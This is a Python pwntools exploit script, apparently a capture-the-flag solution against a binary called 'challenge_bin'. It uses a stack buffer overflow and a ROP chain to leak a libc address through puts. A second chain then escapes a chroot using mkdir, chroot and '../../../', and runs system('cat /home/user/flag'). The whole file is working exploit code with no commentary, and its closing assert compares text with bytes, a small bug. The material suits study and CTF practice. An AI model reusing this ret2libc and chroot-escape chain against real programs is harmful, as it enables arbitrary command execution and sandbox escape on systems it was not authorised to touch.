from pwn import process, remote, u64, p64, ROP,context,ELF

context.binary = "challenge_bin"
elf = ELF("challenge_bin")
p = process()
#p = remote("localhost",1338)
libc = elf.libc
OFFSET = 0x38

rop = ROP(elf)
ret=rop.find_gadget(['ret']).address
pop_rdi=rop.find_gadget(['pop rdi','ret']).address
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main=elf.symbols['main']

payload=b"A"*OFFSET
payload+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)
payload+=p64(main)

print(payload)

p.recvuntil(b"> \n")
p.sendline(payload)

libc_puts=p.readline()[:-1]+b"\x00\x00"
libc_base=u64(libc_puts)-libc.symbols['puts']
libc.address = libc_base


rop=ROP(libc)
rop.raw(b"A"*OFFSET)

cwd = libc.bss()
prev_folder = libc.bss() + 0x28
my_folder = libc.bss() + 0x50
cat_flag = libc.bss() + 0x78

rop.read(0,libc.bss())

rop.mkdir(my_folder)
rop.chroot(my_folder)
rop.chdir(prev_folder)
rop.chroot(prev_folder)

rop.system(cat_flag)
rop.exit(42)

p.recvuntil(b"> \n")

p.sendline(rop.chain())
data = b".".ljust(0x28,b'\x00') 
data+= b"../../../".ljust(0x28,b'\x00') 
data+= b"my_folder".ljust(0x28,b'\x00')
data+= b"cat /home/user/flag".ljust(0x28,b'\x00')
p.sendline(data)

received = p.recvuntil(b'}')
print(received)
assert "BtSCTF" in received 
